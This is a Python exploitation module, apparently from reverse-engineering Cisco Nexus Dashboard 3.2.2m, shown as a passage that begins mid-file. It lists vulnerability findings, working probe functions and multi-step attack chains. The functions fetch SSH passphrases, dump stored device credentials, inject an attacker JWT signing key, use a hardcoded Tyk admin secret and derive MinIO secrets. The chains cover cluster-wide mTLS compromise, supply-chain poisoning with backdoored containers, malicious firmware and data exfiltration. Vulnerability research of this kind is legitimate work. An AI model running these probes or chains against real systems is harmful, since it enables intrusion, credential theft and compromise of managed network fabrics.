            "POST /api/debug/imports": "import full ND configuration",
            "GET /api/debug/exports": "export full ND configuration",
            "POST /api/debug/apigwjwt": "modify API gateway JWT signing keys",
        },
        "attack": (
            "1. Reach confd:19999 from cluster network (mTLS required? — TBD by /certs/server.crt usage); "
            "2. POST /api/debug/ndtrustedcas with attacker CA -> all ND services trust attacker certs; "
            "3. Issue certs signed by attacker CA -> impersonate any ND microservice; "
            "4. Alternate: GET /api/debug/apikeysbyname -> harvest credentials for managed ACI/Nexus devices"
        ),
        "chain": "ND-F03 mTLS cert -> confd debug API -> CA injection -> cluster-wide mTLS bypass",
    },
    "ND-F14": {
        "title": "apigw entrypoint.sh Logs Tyk Admin Secret to /logs/launcher.log at Every Startup",
        "severity": "HIGH",
        "component": "apigw container entrypoint.sh",
        "description": (
            "The apigw container entrypoint (/usr/bin/entrypoint.sh) extracts the Tyk admin "
            "secret from /pdata/tyk.conf and logs it to /logs/launcher.log on every container "
            "startup: "
            "secret=$(grep -Po '\"secret\":.*?[^\\\\]\",' /pdata/tyk.conf) && "
            "log \"APIGW Mgr ready, secret: $secret\". "
            "The /logs volume is shared across ND containers and accessible via "
            "acs techsupport bundle collection. Any operator or attacker with log read access "
            "obtains the live Tyk admin secret. Combined with ND-F11 (default secret unchanged), "
            "this provides a second independent path to the Tyk admin API: "
            "log exfiltration yields the same '352d20ee67be67f6340b4c0605b044b7' value "
            "or any rotation the operator made, revealing the actual production secret "
            "if it was changed from the default."
        ),
        "log_path": "/logs/launcher.log",
        "log_line": "log \"APIGW Mgr ready, secret: $secret\"",
        "secret_source": "/pdata/tyk.conf (persistent data volume, written by APIGWMGR on :30026)",
        "access_paths": [
            "acs techsupport collect -> download tech-support bundle -> extract launcher.log",
            "Any container with /logs volume mount read access",
            "ND-F01 cookie -> keyhole techsupport endpoint -> log bundle",
        ],
        "chain": "ND-F01 cookie -> GET /keyhole/api/v1/techsupport -> launcher.log -> live Tyk admin secret",
    },
    "ND-F19": {
        "title": "MinIO Hardcoded Access Key + Secret Derived from TLS Private Key Line",
        "severity": "HIGH",
        "component": "infra/minio container (minio.sh entrypoint)",
        "description": (
            "minio.sh hardcodes MINIO_ACCESS_KEY='minio-nd-access-key' (same across all ND "
            "deployments). The secret key (MINIO_SECRET_KEY) derives from line 2 of "
            "/minio/certs/private.key via 'sed 2q;d /minio/certs/private.key' — the first "
            "base64-encoded content line of the TLS PEM private key. This is identical across "
            "all ND clusters using the same provisioning, since the TLS cert is generated "
            "during initial setup. "
            "Fallback paths: (1) /minio/data/secret.key — persisted after first derivation, "
            "readable by any process on the minio pod; (2) K8s ConfigMap 'minio-access-key' "
            ".data['initkey'] — readable by any service account with ConfigMap read in the "
            "minio namespace. "
            "The hardcoded access key + derivable secret key gives full MinIO access to all "
            "ND object storage: backup data, logs, configuration exports, and any uploaded "
            "firmware blobs. "
            "Chain with ND-F17/ND-F18: confd /api/debug/passphraseresp exposes TLS key "
            "material context; ND-F01 cookie -> keyhole -> log bundle may contain "
            "/minio/certs/private.key references or the secret.key value."
        ),
        "minio_access_key": "minio-nd-access-key",
        "secret_derivation": "sed '2q;d' /minio/certs/private.key (line 2 of TLS private key PEM)",
        "fallback_paths": [
            "/minio/data/secret.key (persisted after first run)",
            "K8s ConfigMap 'minio-access-key' .data['initkey'] (namespace: minio)",
        ],
        "minio_port": 9000,
        "storage_contents": "ND backups, firmware blobs, logs, configuration exports",
        "chain": "ND-F17 confd TLS cert exposure -> derive MinIO secret -> MinIO API full access",
    },
    "ND-F20": {
        "title": "MinIO Prometheus Metrics Endpoint Unauthenticated — Storage Layout Disclosure",
        "severity": "MEDIUM",
        "component": "infra/minio container (minio.sh, MINIO_PROMETHEUS_AUTH_TYPE=public)",
        "description": (
            "minio.sh sets MINIO_PROMETHEUS_AUTH_TYPE='public', removing all authentication "
            "from the MinIO Prometheus metrics endpoint. "
            "GET /minio/prometheus/metrics (or /metrics on the MinIO metrics port) returns "
            "bucket names, object counts, total storage used, request rates, and error rates "
            "for all ND-managed object stores — without credentials. "
            "Exposed data includes: bucket topology (exposing application-layer separation), "
            "object count per bucket (reveals volume of backup/log data), storage utilization "
            "(infrastructure mapping). "
            "Combined with ND-F19 (known access key), the metrics endpoint confirms which "
            "buckets exist before attempting full data access."
        ),
        "env_var": "MINIO_PROMETHEUS_AUTH_TYPE=public",
        "endpoint": "GET /minio/prometheus/metrics",
        "port": 9000,
        "exposed_data": [
            "Bucket names (application topology inference)",
            "Object counts per bucket",
            "Total storage utilization",
            "Request/error rates (operational fingerprint)",
        ],
        "chain": "ND-F20 bucket enum -> ND-F19 cred derivation -> full MinIO exfil",
    },
}


# ─── Probe Functions ─────────────────────────────────────────────────────────


def read_admin_cookie(cookie_path: str = "/var/run/admin.cookie") -> str | None:
    """
    Read the keyhole admin cookie from the host filesystem.
    Requires read access to /var/run/admin.cookie (chmod 644).
    Attack path: container escape -> host mount -> read cookie.
    """
    try:
        with open(cookie_path, "r") as f:
            return f.read().strip()
    except (PermissionError, FileNotFoundError):
        return None


def probe_keyhole_passphrase(host: str, port: int = 443, cookie: str = "") -> dict:
    """
    Call /keyhole/api/v1/passphrase to retrieve the SSH passphrase.
    Requires the admin cookie (read from /var/run/admin.cookie or brute-forced).
    ND-F01 + ND-F02 combined: cookie read + passphrase exfiltration.
    """
    url = f"https://{host}:{port}/keyhole/api/v1/passphrase?cookie={urllib.parse.quote(cookie)}"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            return {
                "status": resp.status,
                "passphrase": json.loads(resp.read().decode()),
                "finding": "ND-F02",
            }
    except Exception as e:
        return {"error": str(e)}


def probe_keyhole_dbgtoken(host: str, port: int = 443, cookie: str = "") -> dict:
    """
    Call /keyhole/api/v1/dbgtoken — returns SSH challenge plugin token.
    ND-F02.
    """
    url = f"https://{host}:{port}/keyhole/api/v1/dbgtoken?cookie={urllib.parse.quote(cookie)}"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            return {
                "status": resp.status,
                "token": json.loads(resp.read().decode()),
                "finding": "ND-F02",
            }
    except Exception as e:
        return {"error": str(e)}


def probe_keyhole_system_config(host: str, port: int = 443, cookie: str = "") -> dict:
    """
    Call /keyhole/api/v1/system-config — returns syscfg.yaml minus admin_passwd.
    Returns nodeRole, firstMaster, cluster topology.
    ND-F01.
    """
    url = f"https://{host}:{port}/keyhole/api/v1/system-config?cookie={urllib.parse.quote(cookie)}"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            return {
                "status": resp.status,
                "config": json.loads(resp.read().decode()),
                "finding": "ND-F01",
            }
    except Exception as e:
        return {"error": str(e)}


def probe_etcd_kms_noauth(host: str, port: int = 3379) -> dict:
    """
    Probe etcd 3.3.15 KMS endpoint for unauthenticated access.
    CVE-2021-28235: auth bypass via /auth/token/revoke before token validation.
    Returns etcd /health and attempts key list via v3 range request.
    ND-F03.
    """
    # /health endpoint — no auth required
    results = {}
    for path in ["/health", "/version"]:
        url = f"http://{host}:{port}{path}"
        try:
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req, timeout=3) as resp:
                results[path] = {
                    "status": resp.status,
                    "body": resp.read().decode()[:200],
                }
        except Exception as e:
            results[path] = {"error": str(e)}

    # CVE-2021-28235: POST /auth/token/revoke with crafted token before auth enabled
    revoke_url = f"http://{host}:{port}/v3/auth/token/revoke"
    try:
        import base64
        payload = json.dumps({"token": "test"}).encode()
        req = urllib.request.Request(revoke_url, data=payload,
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=3) as resp:
            results["cve_2021_28235_probe"] = {
                "status": resp.status,
                "body": resp.read().decode()[:200],
                "finding": "ND-F03",
            }
    except Exception as e:
        results["cve_2021_28235_probe"] = {"error": str(e)}

    return results


def probe_kms_grpc_port(host: str, port: int = 7777) -> dict:
    """
    TCP banner probe on kms.bin gRPC port 7777.
    Confirms kms.bin is reachable; gRPC h2 connection prefix indicates service.
    ND-F03.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, port))
        # gRPC preface: PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n
        s.send(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\x00\x00\x00\x04\x00\x00\x00\x00\x00")
        banner = s.recv(64)
        s.close()
        return {
            "port": port,
            "banner_hex": banner.hex(),
            "reachable": True,
            "finding": "ND-F03",
        }
    except Exception as e:
        return {"error": str(e), "reachable": False}


def probe_aaaserver_trustedjwtkeys(host: str, port: int = 7770, attacker_pubkey_pem: str = "") -> dict:
    """
    POST attacker-controlled RSA public key to aaaserver TrustedJWTKeys endpoint.
    ND-F10: Requires mTLS client cert (from ND-F03 etcd bypass) or internal cluster access.
    On success, JWTs signed with the corresponding private key are accepted as admin.
    """
    import base64
    url = f"https://{host}:{port}/aaa/v4/TrustedJWTKeys"
    payload = json.dumps({
        "name": "attacker-key",
        "keyType": "RSA",
        "publicKey": attacker_pubkey_pem,
        "privileges": ["all/admin/"],
    }).encode()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url, data=payload,
                                     headers={"Content-Type": "application/json"},
                                     method="POST")
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            return {
                "status": resp.status,
                "body": resp.read().decode()[:500],
                "finding": "ND-F10",
            }
    except Exception as e:
        return {"error": str(e), "finding": "ND-F10"}


def probe_tyk_admin_secret(host: str, port: int = 443,
                            secret: str = "352d20ee67be67f6340b4c0605b044b7") -> dict:
    """
    Probe Tyk admin API with default or extracted secret.
    ND-F11: GET /tyk/apis lists all API definitions if secret is accepted.
    Use x-tyk-authorization header; returns API list on 200.
    """
    url = f"https://{host}:{port}/tyk/apis"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url, headers={"x-tyk-authorization": secret})
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            body = resp.read().decode()
            return {
                "status": resp.status,
                "api_count": len(json.loads(body)) if body.startswith("[") else "N/A",
                "body_preview": body[:400],
                "secret_accepted": resp.status == 200,
                "finding": "ND-F11",
            }
    except Exception as e:
        return {"error": str(e), "finding": "ND-F11"}


def probe_firmwared_upload(host: str, port: int = 443) -> dict:
    """
    Check firmwared firmware upload endpoint reachability.
    ND-F12: HEAD /api/v1/firmware/upload reveals if firmwared is network-reachable.
    Full exploit requires valid firmware blob signed by AbraxasACIDev key.
    """
    url = f"https://{host}:{port}/api/v1/firmware/upload"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url, method="HEAD")
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            return {
                "status": resp.status,
                "headers": dict(resp.headers),
                "reachable": True,
                "finding": "ND-F12",
            }
    except urllib.error.HTTPError as e:
        return {"http_error": e.code, "reachable": True, "finding": "ND-F12"}
    except Exception as e:
        return {"error": str(e), "reachable": False, "finding": "ND-F12"}


def read_tyk_secret_from_log(log_path: str = "/logs/launcher.log") -> dict:
    """
    Extract Tyk admin secret from apigw startup log.
    ND-F14: entrypoint.sh logs 'APIGW Mgr ready, secret: "secret":"<value>"' on every start.
    Requires read access to /logs volume (shared across ND containers).
    """
    import re
    result = {"log_path": log_path, "finding": "ND-F14", "secrets_found": []}
    try:
        with open(log_path, "r") as f:
            for line in f:
                if "APIGW Mgr ready, secret:" in line:
                    m = re.search(r'"secret":\s*"([^"]+)"', line)
                    if m:
                        result["secrets_found"].append({
                            "line": line.strip()[:200],
                            "secret": m.group(1),
                        })
    except (PermissionError, FileNotFoundError) as e:
        result["error"] = str(e)
    return result


def probe_confd_debug_api(host: str, port: int = 19999, path: str = "/api/debug/class/ndtrustedcas") -> dict:
    """
    Probe confd debug API for unauthenticated access.
    ND-F16: All management endpoints under /api/debug/ prefix.
    Key paths: /api/debug/class/credentialstore, /api/debug/class/ndtrustedcas,
               /api/debug/passphraseresp (CA passphrase).
    """
    url = f"https://{host}:{port}{path}"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            body = resp.read().decode()
            return {
                "status": resp.status,
                "body_preview": body[:500],
                "credential_count": body.count('"owner"') if "credentialstore" in path else "N/A",
                "finding": "ND-F16/ND-F18",
            }
    except urllib.error.HTTPError as e:
        return {"http_error": e.code, "path": path, "finding": "ND-F16"}
    except Exception as e:
        return {"error": str(e), "path": path}


def probe_securitymgr_ca_passphrase(host: str, port: int = 19999) -> dict:
    """
    GET confd debug passphrase response — returns live CA certificate request passphrase.
    ND-F17: GET /api/debug/passphraseresp -> currCertReqPassphrase.
    """
    url = f"https://{host}:{port}/api/debug/passphraseresp"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            body = json.loads(resp.read().decode())
            return {
                "status": resp.status,
                "passphrase_present": "currCertReqPassphrase" in body,
                "passphrase": body.get("currCertReqPassphrase", "NOT_FOUND"),
                "expiry": body.get("currCertReqPassphraseExpiry", ""),
                "finding": "ND-F17",
            }
    except Exception as e:
        return {"error": str(e), "finding": "ND-F17"}


def dump_credential_store(host: str, port: int = 19999) -> dict:
    """
    GET /api/debug/class/credentialstore — dump all stored device credentials.
    ND-F18: Returns { owner, components: { <device>: { credentials: {user/pass}, sharedWith } } }
    for all ACI APIC and Nexus fabric sites managed by this ND cluster.
    """
    url = f"https://{host}:{port}/api/debug/class/credentialstore"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            body = resp.read().decode()
            stores = json.loads(body) if body.startswith("[") else [json.loads(body)]
            return {
                "status": resp.status,
                "credential_store_count": len(stores),
                "owners": [s.get("owner", "?") for s in stores],
                "raw": stores,
                "finding": "ND-F18",
            }
    except Exception as e:
        return {"error": str(e), "finding": "ND-F18"}


def probe_minio_prometheus(host: str, port: int = 9000) -> dict:
    """
    GET /minio/prometheus/metrics — unauthenticated metrics endpoint.
    ND-F20: MINIO_PROMETHEUS_AUTH_TYPE=public exposes bucket names + object counts.
    """
    url = f"http://{host}:{port}/minio/prometheus/metrics"
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read().decode(errors="replace")
            buckets = [
                line.split('"')[1]
                for line in body.splitlines()
                if 'minio_bucket_usage_object_total' in line and '"' in line
            ]
            return {
                "status": resp.status,
                "bucket_count": len(buckets),
                "buckets": buckets[:20],
                "authenticated": False,
                "finding": "ND-F20",
            }
    except Exception as e:
        return {"error": str(e), "finding": "ND-F20"}


def derive_minio_secret_from_cert(cert_pem_path: str) -> dict:
    """
    Derive MinIO secret key from TLS private key line 2 (minio.sh fallback logic).
    ND-F19: sed '2q;d' /minio/certs/private.key == MINIO_SECRET_KEY at first startup.
    Access key is always 'minio-nd-access-key'.
    """
    try:
        with open(cert_pem_path, "r") as f:
            lines = f.readlines()
        if len(lines) < 2:
            return {"error": "cert too short", "finding": "ND-F19"}
        secret_key = lines[1].strip()
        return {
            "minio_access_key": "minio-nd-access-key",
            "minio_secret_key": secret_key,
            "source": cert_pem_path,
            "note": "secret.key persisted at /minio/data/secret.key after first run",
            "finding": "ND-F19",
        }
    except Exception as e:
        return {"error": str(e), "finding": "ND-F19"}


def probe_minio_api(host: str, port: int = 9000, access_key: str = "minio-nd-access-key",
                    secret_key: str = "") -> dict:
    """
    Test MinIO API access using hardcoded access key + derived secret.
    ND-F19: list buckets via MinIO ListBuckets (S3-compat GET /).
    Signing omitted — use mc or s3cmd with these creds for full access.
    """
    url = f"http://{host}:{port}/"
    try:
        req = urllib.request.Request(url)
        req.add_header("Authorization", f"AWS {access_key}:{secret_key}")
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read().decode(errors="replace")
            return {
                "status": resp.status,
                "access_key": access_key,
                "body_preview": body[:300],
                "finding": "ND-F19",
            }
    except urllib.request.HTTPError as e:
        return {"http_error": e.code, "access_key": access_key, "finding": "ND-F19"}
    except Exception as e:
        return {"error": str(e), "finding": "ND-F19"}


def check_build_annotation_leakage(squashfs_path: str, service: str = "kms") -> dict:
    """
    Read OCI manifest annotation from squashfs oci_repo to extract CI build metadata.
    Requires squashfs to be mounted or unsquashfs available.
    ND-F06.
    """
    # Mount squashfs and read manifest
    result = {"service": service, "finding": "ND-F06", "annotations": {}}
    manifest_path = f"/tmp/nd-rootfs/oci_repo/apic-sn/{service}/blobs/sha256"
    try:
        blobs = subprocess.check_output(
            ["sudo", "ls", manifest_path], text=True
        ).split()
        for blob in blobs:
            if len(blob) == 64:
                content = subprocess.check_output(
                    ["sudo", "cat", f"{manifest_path}/{blob}"], text=True
                )
                try:
                    j = json.loads(content)
                    if "annotations" in j and "io.stackeroci.stacker.stacker_yaml" in j.get("annotations", {}):
                        result["annotations"][blob[:12]] = j["annotations"]["io.stackeroci.stacker.stacker_yaml"][:200]
                except json.JSONDecodeError:
                    pass
    except Exception as e:
        result["error"] = str(e)
    return result


# ─── Attack Chain Summary ────────────────────────────────────────────────────


ATTACK_CHAINS = {
    "chain_1_node_compromise": {
        "title": "Container Escape -> Node SSH Access",
        "steps": [
            "1. Container escape OR host-volume mount read access to ND node",
            "2. cat /var/run/admin.cookie (chmod 644, world-readable) -> cookie value",
            "3. GET /keyhole/api/v1/passphrase?cookie=<value> -> SSH passphrase",
            "4. GET /keyhole/api/v1/dbgtoken?cookie=<value> -> SSH debug token",
            "5. SSH to ND node using passphrase + ifc_admin key",
            "6. kubectl with rescue-user token -> full cluster enumeration",
        ],
        "entry_requirement": "Any process on ND host with /var/run read access",
        "findings": ["ND-F01", "ND-F02", "ND-F05"],
    },
    "chain_2_pki_collapse": {
        "title": "etcd Auth Bypass -> Full Cluster mTLS Compromise",
        "steps": [
            "1. Reach KMS etcd on port 3379 (from kms pod or network access)",
            "2. CVE-2021-28235: POST /v3/auth/token/revoke -> auth bypass",
            "3. ETCDCTL_API=3 etcdctl get --prefix '' -> enumerate all stored keys",
            "4. Extract private keys for all 80+ services from kms_etcd store",
            "5. Forge mTLS certificates for any service (Kafka, K8s apiserver, apigw)",
            "6. Impersonate aaamgr/aaaserver -> auth bypass cluster-wide",
        ],
        "entry_requirement": "Network access to kms pod (port 3379) or node-level access",
        "findings": ["ND-F03", "ND-F04"],
    },
    "chain_3_ci_pivot": {
        "title": "OCI Annotation Intel -> Internal Network Pivot",
        "steps": [
            "1. Extract stacker YAML from any OCI manifest annotation",
            "2. Identify SSH key ID: 23cd94a3-.../ssh-key-GH_SSH_KEY (Jenkins CI key)",
            "3. Access aci-github.cisco.com with exfiltrated CI SSH key",
            "4. Read ND source repositories -> hardcoded secrets, internal API endpoints",
            "5. Access aci-docker-reg.cisco.com -> push malicious container layers",
            "6. Poison next ND upgrade with backdoored container",
        ],
        "entry_requirement": "ND image file read access (available to any ND node)",
        "findings": ["ND-F06"],
    },
    "chain_4_jwt_injection": {
        "title": "etcd Bypass -> TrustedJWTKeys Injection -> Forged Admin JWT",
        "steps": [
            "1. CVE-2021-28235 against KMS etcd:3379 -> dump app-user mTLS certs (ND-F03)",
            "2. Use app-user mTLS cert (ciscoAvPair: all/admin/) to reach aaaserver:7770",
            "3. POST attacker RSA pubkey to /aaa/v4/TrustedJWTKeys (ND-F10)",
            "4. Sign JWT {sub: <any-user>, ciscoAvPair: all/admin/} with attacker private key",
            "5. Present JWT to ND API gateway -> full admin access cluster-wide",
            "6. Injected key persists in MongoDB -> survives aaaserver restarts",
        ],
        "entry_requirement": "Network access to KMS etcd port 3379",
        "findings": ["ND-F03", "ND-F04", "ND-F10"],
    },
    "chain_5_apigw_bypass": {
        "title": "Default Tyk Secret -> Gateway API Key Injection -> Full Auth Bypass",
        "steps": [
            "1. Network access to apigw (port 443) — internal cluster or external if exposed",
            "2. POST /tyk/apis with x-tyk-authorization: 352d20ee67be67f6340b4c0605b044b7 "
               "-> create open-policy API definition shadowing existing ND routes (ND-F11)",
            "3. All ND UI and API calls matching new route bypass authentication",
            "4. Alternate: GET /tyk/keys -> enumerate all active session tokens",
            "5. Alternate: read /logs/launcher.log -> extract live secret if rotated (ND-F14)",
        ],
        "entry_requirement": "Network access to Tyk admin API (internal cluster or if port 443 exposed)",
        "findings": ["ND-F11", "ND-F14"],
    },
    "chain_6_firmwared_ssrf": {
        "title": "acs upgrade peer:// -> firmwared SSRF -> Internal Network Discovery",
        "steps": [
            "1. Obtain admin cookie (ND-F01) -> call acs upgrade update",
            "2. filepath=peer://TARGET_IP:PORT causes firmwared to initiate outbound TCP",
            "3. Probe cluster-internal services not exposed to management network",
            "4. Combine with ND-F12 dev key: forge firmware blob -> send to /api/v1/firmware/upload",
            "5. Signed with AbraxasACIDev key -> accepted as valid -> deploy malicious firmware",
        ],
        "entry_requirement": "ND-F01 cookie + acs binary execution on node",
        "findings": ["ND-F09", "ND-F12"],
    },
    "chain_7_credential_harvest": {
        "title": "Log Read -> Multi-Credential Harvest -> Lateral Movement",
        "steps": [
            "1. ND-F01 cookie -> GET /keyhole/api/v1/techsupport -> download log bundle",
            "2. keyhole.log contains: peer_password from acs upgrade operations (ND-F09)",
            "3. launcher.log contains: Tyk admin secret (ND-F14)",
            "4. ND admin password -> SSH to ND nodes -> K8s cluster access (ND-F02)",
            "5. Tyk admin secret -> POST /tyk/apis -> inject gateway bypass (ND-F11)",
            "6. Three independent credentials from a single log bundle read",
        ],
        "entry_requirement": "ND-F01 world-readable cookie",
        "findings": ["ND-F01", "ND-F09", "ND-F14", "ND-F11"],
    },
    "chain_8_minio_exfil": {
        "title": "TLS Cert Read -> MinIO Cred Derivation -> Full Object Store Exfil",
        "steps": [
            "1. ND-F17 GET confd:19999/api/debug/passphraseresp OR ND-F01 log bundle read",
            "2. Obtain /minio/certs/private.key (minio pod volume or keyhole techsupport bundle)",
            "3. derive_minio_secret_from_cert() -> MINIO_SECRET_KEY = line 2 of private.key",
            "4. access_key='minio-nd-access-key' (hardcoded, same on all ND deployments)",
            "5. GET /minio/prometheus/metrics (no auth) -> enumerate bucket names (ND-F20)",
            "6. mc alias set nd http://minio:9000 minio-nd-access-key <derived_secret> -> "
               "mc ls nd/ -> download all ND backups, config exports, firmware blobs",
            "7. Alternate: K8s kubectl get configmap minio-access-key -o json "
               "-> .data['initkey'] = same derived key after first startup",
        ],
        "entry_requirement": "Read access to minio TLS cert or K8s ConfigMap in minio namespace",
        "findings": ["ND-F19", "ND-F20", "ND-F17"],
    },
}


if __name__ == "__main__":
    import sys

    print("=== Cisco Nexus Dashboard 3.2.2m RE Module ===")
    print(f"Findings: {len(FINDINGS)}")
    print()

    for fid, f in FINDINGS.items():
        sev = f["severity"]
        print(f"[{sev:8}] {fid}: {f['title']}")

    print()
    print("Attack Chains:")
    for cid, chain in ATTACK_CHAINS.items():
        print(f"  {cid}: {chain['title']}")
        print(f"    Entry: {chain['entry_requirement']}")
        for step in chain["steps"][:3]:
            print(f"      {step}")
        print()

    if len(sys.argv) > 1:
        target = sys.argv[1]
        print(f"[*] Probing {target}")
        print("[*] Checking etcd KMS port 3379...")
        print(json.dumps(probe_etcd_kms_noauth(target), indent=2))
        print("[*] Checking kms.bin gRPC port 7777...")
        print(json.dumps(probe_kms_grpc_port(target), indent=2))
